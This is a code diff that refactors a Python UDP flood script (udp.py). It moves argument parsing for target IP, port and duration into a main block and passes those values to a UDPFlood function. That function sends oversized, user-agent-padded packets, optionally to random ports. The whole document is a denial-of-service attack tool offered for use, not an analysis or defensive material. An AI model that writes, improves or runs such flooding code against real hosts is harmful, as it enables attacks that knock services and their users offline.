@@ -4,18 +4,12 @@ import sys
 import time
 
 
-if len(sys.argv) != 4:
-    sys.exit('Usage: udp.py ip port time')
-
 def read_user_agents(file):
     with open(file, 'r') as f:
         return [line.strip() for line in f.readlines()]
 
-def UDPFlood():
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    dur = int(sys.argv[3])
 
+def UDPFlood(ip, port, dur):
     
     user_agents = read_user_agents('ua.txt')
 
@@ -31,7 +25,7 @@ def UDPFlood():
         
         user_agent = random.choice(user_agents)
 
-        
+         
         bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  # جعل الحزمة بحجم ثابت
         port = (random.randint(1, 65535), port)[randport]
 
@@ -42,4 +36,13 @@ def UDPFlood():
 
     print('DONE')
 
-UDPFlood()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        sys.exit('Usage: python udp.py ip port time')
+
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    dur = int(sys.argv[3])
+
+    UDPFlood(ip, port, dur)
